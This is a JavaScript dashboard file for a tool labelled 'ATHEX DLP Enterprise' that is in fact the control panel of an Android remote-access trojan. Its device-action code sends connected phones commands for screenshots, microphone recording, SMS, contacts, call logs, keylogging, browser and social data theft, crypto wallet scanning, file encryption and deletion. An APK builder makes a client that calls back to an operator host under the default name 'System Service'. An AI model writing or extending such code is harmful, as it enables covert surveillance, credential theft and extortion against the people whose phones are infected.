/**
 * ATHEX DLP Enterprise - Dashboard JavaScript
 * =============================================
 * Main dashboard functionality, Socket.IO events,
 * device management, and UI interactions.
 */

// ============================================================
// GLOBAL STATE
// ============================================================
const AppState = {
    socket: null,
    isConnected: false,
    currentPage: 'home',
    selectedDevice: null,
    devices: { online: [], offline: [] },
    notificationCount: 0,
    autoScroll: true
};

// ============================================================
// INITIALIZATION
// ============================================================
document.addEventListener('DOMContentLoaded', () => {
    initThreeJSBackground();
    initSocketIO();
    initNavigation();
    initDeviceRefresh();
    initSlidePanel();
});

// ============================================================
// THREE.JS BACKGROUND
// ============================================================
function initThreeJSBackground() {
    const canvas = document.getElementById('cyber-bg');
    if (!canvas) return;

    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });

    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

    // Grid
    const gridHelper = new THREE.GridHelper(30, 60, 0x00f0ff, 0x003333);
    gridHelper.position.y = -2;
    scene.add(gridHelper);

    // Particles
    const particlesGeometry = new THREE.BufferGeometry();
    const count = 2000;
    const positions = new Float32Array(count * 3);
    const colors = new Float32Array(count * 3);

    for (let i = 0; i < count * 3; i += 3) {
        positions[i] = (Math.random() - 0.5) * 20;
        positions[i + 1] = (Math.random() - 0.5) * 15;
        positions[i + 2] = (Math.random() - 0.5) * 20;
        colors[i] = Math.random() * 0.5;
        colors[i + 1] = 0.8 + Math.random() * 0.2;
        colors[i + 2] = 0.8 + Math.random() * 0.2;
    }

    particlesGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));

    const particlesMaterial = new THREE.PointsMaterial({
        size: 0.03,
        vertexColors: true,
        blending: THREE.AdditiveBlending,
        depthWrite: false
    });

    const particles = new THREE.Points(particlesGeometry, particlesMaterial);
    scene.add(particles);

    camera.position.set(5, 3, 8);
    camera.lookAt(0, 0, 0);

    function animate() {
        requestAnimationFrame(animate);
        particles.rotation.y += 0.0003;
        particles.rotation.x += 0.0001;
        gridHelper.rotation.y += 0.0001;
        renderer.render(scene, camera);
    }

    animate();

    window.addEventListener('resize', () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
    });
}

// ============================================================
// SOCKET.IO
// ============================================================
function initSocketIO() {
    AppState.socket = io();

    AppState.socket.on('connect', () => {
        AppState.isConnected = true;
        updateConnectionStatus(true);
        addTerminalLine('system', 'Connected to ATHEX DLP Server');
        refreshDevices();
    });

    AppState.socket.on('disconnect', () => {
        AppState.isConnected = false;
        updateConnectionStatus(false);
        addTerminalLine('error', 'Disconnected from server');
    });

    AppState.socket.on('new_notification', (data) => {
        AppState.notificationCount++;
        updateNotificationBadge();
        const time = new Date().toLocaleTimeString();
        addTerminalLine('notification', `[${time}] ${data.app_name} | ${data.title}`);
        showToast('info', `${data.app_name}: ${data.title}`);
    });

    AppState.socket.on('device_connected', (device) => {
        addTerminalLine('success', `Device connected: ${device.model}`);
        refreshDevices();
    });

    AppState.socket.on('device_disconnected', (device) => {
        addTerminalLine('warning', `Device disconnected: ${device.model}`);
        refreshDevices();
    });

    AppState.socket.on('devices_update', (data) => {
        AppState.devices = data;
        renderDeviceList(data.online || [], data.offline || []);
        updateStats();
    });

    AppState.socket.on('file_listing_update', (data) => {
        renderFileExplorer(data.files || []);
    });

    AppState.socket.on('command_result', (data) => {
        addTerminalLine('info', `Command result: ${JSON.stringify(data)}`);
    });

    AppState.socket.on('terminal_log', (data) => {
        addTerminalLine(data.type, data.message);
    });

    AppState.socket.on('alert', (data) => {
        showToast(data.level, data.message);
    });
}

// ============================================================
// NAVIGATION
// ============================================================
function initNavigation() {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault();
            const page = this.dataset.page;
            navigateTo(page);
            
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            this.classList.add('active');
            
            if (window.innerWidth <= 1024) {
                toggleSidebar();
            }
        });
    });

    // Bottom nav
    document.querySelectorAll('.bottom-nav-item').forEach(item => {
        item.addEventListener('click', function() {
            const page = this.dataset.page;
            navigateTo(page);
            
            document.querySelectorAll('.bottom-nav-item').forEach(i => i.classList.remove('active'));
            this.classList.add('active');
        });
    });
}

function navigateTo(page) {
    AppState.currentPage = page;
    
    document.querySelectorAll('.page-section').forEach(s => s.classList.add('hidden'));
    
    const section = document.getElementById(`page-${page}`);
    if (section) section.classList.remove('hidden');
    
    document.getElementById('pageTitle').textContent = getPageTitle(page);
    
    if (page === 'home') refreshDevices();
}

function getPageTitle(page) {
    const titles = {
        home: '📱 Connected Devices',
        notifications: '🔔 Live Notifications',
        files: '📁 File Explorer',
        builder: '🔨 APK Builder',
        settings: '⚙️ Settings',
        logs: '📋 System Logs'
    };
    return titles[page] || 'Dashboard';
}

function toggleSidebar() {
    document.getElementById('sidebar').classList.toggle('open');
}

// ============================================================
// DEVICE MANAGEMENT
// ============================================================
function initDeviceRefresh() {
    refreshDevices();
    setInterval(refreshDevices, 30000);
}

async function refreshDevices() {
    try {
        const response = await fetch('/api/devices');
        const data = await response.json();
        
        if (data.success) {
            AppState.devices = data;
            renderDeviceList(data.online || [], data.offline || []);
            updateStats();
            updateClientSelector();
        }
    } catch (error) {
        console.error('Failed to refresh devices:', error);
    }
}

function renderDeviceList(online, offline) {
    const grid = document.getElementById('deviceGrid');
    if (!grid) return;

    if (online.length === 0 && offline.length === 0) {
        grid.innerHTML = `
            <div style="grid-column: 1/-1; text-align: center; padding: 60px; color: var(--text-muted);">
                <i class="fas fa-satellite-dish" style="font-size: 48px; display: block; margin-bottom: 16px; opacity: 0.5;"></i>
                <p>No devices connected</p>
                <p style="font-size: 12px; margin-top: 8px;">Waiting for Android clients...</p>
            </div>`;
        return;
    }

    let html = '';
    
    [...online, ...offline].forEach(device => {
        const isOnline = device.is_online;
        html += `
            <div class="device-card">
                <div class="device-card-header">
                    <div>
                        <div class="device-name">
                            <span style="color: ${isOnline ? 'var(--accent-green)' : 'var(--accent-red)'}">●</span>
                            ${device.model}
                        </div>
                        <div class="device-model">${device.android_version} | ${device.ip_address}</div>
                    </div>
                    <div class="device-status" style="color: ${isOnline ? 'var(--accent-green)' : 'var(--accent-red)'}">
                        ${isOnline ? 'Online' : 'Offline'}
                    </div>
                </div>
                <div class="device-info">
                    ID: ${(device.device_id || '').substring(0, 12)}...<br>
                    Notifications: ${device.notification_count || 0}
                </div>
                <div class="device-actions">
                    <button class="neon-btn btn-sm" onclick="openDeviceManager('${device.session_id}')">
                        ⚡ MANAGE
                    </button>
                </div>
            </div>`;
    });

    grid.innerHTML = html;
}

function updateStats() {
    const online = AppState.devices.online || [];
    document.getElementById('activeDevices').textContent = online.length;
    document.getElementById('clientBadge').textContent = online.length;
}

function updateClientSelector() {
    const selector = document.getElementById('clientSelector');
    if (!selector) return;

    selector.innerHTML = '<option value="">Select Device</option>';
    
    (AppState.devices.online || []).forEach(device => {
        selector.innerHTML += `
            <option value="${device.session_id}">
                ${device.model} (${device.ip_address})
            </option>`;
    });
}

function updateConnectionStatus(connected) {
    const dot = document.getElementById('connectionDot');
    const text = document.getElementById('connectionText');
    if (dot) {
        dot.className = `status-dot ${connected ? 'online' : 'offline'}`;
    }
    if (text) {
        text.textContent = connected ? 'Connected' : 'Disconnected';
    }
}

function updateNotificationBadge() {
    const badge = document.getElementById('notifBadge');
    if (badge) badge.textContent = AppState.notificationCount;
}

// ============================================================
// SLIDE PANEL (Device Manager)
// ============================================================
function initSlidePanel() {
    const overlay = document.getElementById('slidePanelOverlay');
    if (overlay) {
        overlay.addEventListener('click', closeSlidePanel);
    }
}

async function openDeviceManager(sessionId) {
    AppState.selectedDevice = sessionId;
    
    try {
        const response = await fetch(`/api/devices/${sessionId}`);
        const data = await response.json();
        
        if (data.success) {
            const device = data.device;
            document.getElementById('sidebarDeviceName').textContent = `📱 ${device.model}`;
            document.getElementById('sidebarDeviceInfo').innerHTML = `
                <div class="text-sm">
                    <div>OS: Android ${device.android_version}</div>
                    <div>IP: ${device.ip_address}</div>
                    <div>ID: ${(device.device_id || '').substring(0, 16)}...</div>
                    <div>Status: ${device.is_online ? '🟢 Online' : '🔴 Offline'}</div>
                </div>`;
        }
    } catch (error) {
        console.error('Failed to get device info:', error);
    }
    
    document.getElementById('slidePanel').classList.add('open');
    document.getElementById('slidePanelOverlay').classList.add('active');
}

function closeSlidePanel() {
    document.getElementById('slidePanel').classList.remove('open');
    document.getElementById('slidePanelOverlay').classList.remove('active');
}

// ============================================================
// DEVICE ACTIONS
// ============================================================
async function deviceAction(action) {
    const sessionId = AppState.selectedDevice;
    if (!sessionId) return;

    const commands = {
        screenshot: 'SCREENSHOT',
        microphone: 'RECORD_AUDIO',
        files: 'LIST_FILES',
        notifications: 'GET_NOTIFICATIONS',
        location: 'GET_LOCATION',
        contacts: 'GET_CONTACTS',
        sms: 'GET_SMS',
        calls: 'GET_CALL_LOGS',
        clipboard: 'GET_CLIPBOARD',
        keylogger: 'START_KEYLOGGER',
        apps: 'GET_APPS',
        browser: 'GET_BROWSER_DATA',
        social: 'GET_SOCIAL_DATA',
        crypto: 'SCAN_CRYPTO',
        encrypt: 'ENCRYPT_FILE',
        delete_data: 'DELETE_FILE'
    };

    const command = commands[action];
    if (!command) return;

    try {
        const response = await fetch('/api/command/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                session_id: sessionId,
                command: command
            })
        });
        
        const data = await response.json();
        if (data.success) {
            showToast('success', `Command sent: ${action}`);
            addTerminalLine('info', `Sent ${command} to device`);
        } else {
            showToast('error', 'Failed to send command');
        }
    } catch (error) {
        showToast('error', 'Network error');
    }
    
    closeSlidePanel();
}

// ============================================================
// FILE EXPLORER
// ============================================================
function loadFiles() {
    const sessionId = document.getElementById('clientSelector')?.value;
    if (!sessionId) {
        showToast('warning', 'Select a device first');
        return;
    }
    
    AppState.selectedDevice = sessionId;
    
    AppState.socket.emit('request_file_listing', {
        session_id: sessionId,
        path: '/sdcard/'
    });
}

function renderFileExplorer(files) {
    const grid = document.getElementById('fileGrid');
    if (!grid) return;

    if (!files || files.length === 0) {
        grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:40px;color:var(--text-muted)">Empty directory</div>';
        return;
    }

    grid.innerHTML = files.map(file => `
        <div class="file-item" onclick="${file.type === 'directory' ? `navigatePath('${file.path}')` : ''}">
            <div class="file-icon">${getFileIcon(file.name)}</div>
            <div>
                <div class="file-name">${file.name}</div>
                <div class="file-size">${file.size_formatted || ''}</div>
            </div>
        </div>
    `).join('');
}

function getFileIcon(filename) {
    const ext = (filename || '').split('.').pop()?.toLowerCase();
    const icons = {
        pdf: '📕', doc: '📘', docx: '📘', txt: '📄',
        jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️',
        mp4: '🎬', mp3: '🎵', apk: '📱', zip: '📦',
        locked: '🔒'
    };
    return icons[ext] || '📄';
}

// ============================================================
// TERMINAL
// ============================================================
function addTerminalLine(type, message) {
    const terminal = document.getElementById('terminalBody');
    if (!terminal) return;

    const line = document.createElement('div');
    line.className = `terminal-line ${type}`;
    line.textContent = message;
    terminal.appendChild(line);

    if (AppState.autoScroll) {
        terminal.scrollTop = terminal.scrollHeight;
    }

    while (terminal.children.length > 500) {
        terminal.removeChild(terminal.firstChild);
    }
}

function clearTerminal() {
    const terminal = document.getElementById('terminalBody');
    if (terminal) terminal.innerHTML = '';
    AppState.notificationCount = 0;
    updateNotificationBadge();
}

// ============================================================
// APK BUILDER
// ============================================================
async function buildAPK() {
    const host = document.getElementById('builderIP')?.value || '127.0.0.1';
    const port = document.getElementById('builderPort')?.value || '22533';
    const name = document.getElementById('builderAppName')?.value || 'System Service';

    const statusEl = document.getElementById('buildStatus');
    if (statusEl) statusEl.innerHTML = '<div class="spinner"></div> Building APK...';

    try {
        const response = await fetch('/api/apk/build', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                server_host: host,
                server_port: parseInt(port),
                app_name: name
            })
        });

        const data = await response.json();

        if (data.success) {
            if (statusEl) statusEl.innerHTML = `
                <div style="color: var(--accent-green);">
                    ✅ APK Built Successfully!<br>
                    Size: ${data.apk_size_formatted}<br>
                    <a href="/api/apk/download/${data.build_id}" class="btn btn-primary btn-sm mt-2">📥 Download APK</a>
                </div>`;
            showToast('success', 'APK built successfully!');
        } else {
            if (statusEl) statusEl.innerHTML = `<div style="color: var(--accent-red);">❌ Build failed: ${data.error}</div>`;
            showToast('error', 'APK build failed');
        }
    } catch (error) {
        if (statusEl) statusEl.innerHTML = '<div style="color: var(--accent-red);">❌ Network error</div>';
    }
}

// ============================================================
// TOAST NOTIFICATIONS
// ============================================================
function showToast(type, message) {
    const container = document.getElementById('toastContainer');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
    toast.innerHTML = `<span>${icons[type] || ''}</span> ${message}`;
    
    container.appendChild(toast);

    setTimeout(() => {
        toast.style.animation = 'slideInRight 0.3s ease-out reverse';
        setTimeout(() => toast.remove(), 300);
    }, 4000);
}

// ============================================================
// UTILITY
// ============================================================
function refreshAll() {
    refreshDevices();
    showToast('info', 'Refreshed');
}

function showConfigModal() {
    document.getElementById('configModal').style.display = 'flex';
}

function closeConfigModal() {
    document.getElementById('configModal').style.display = 'none';
}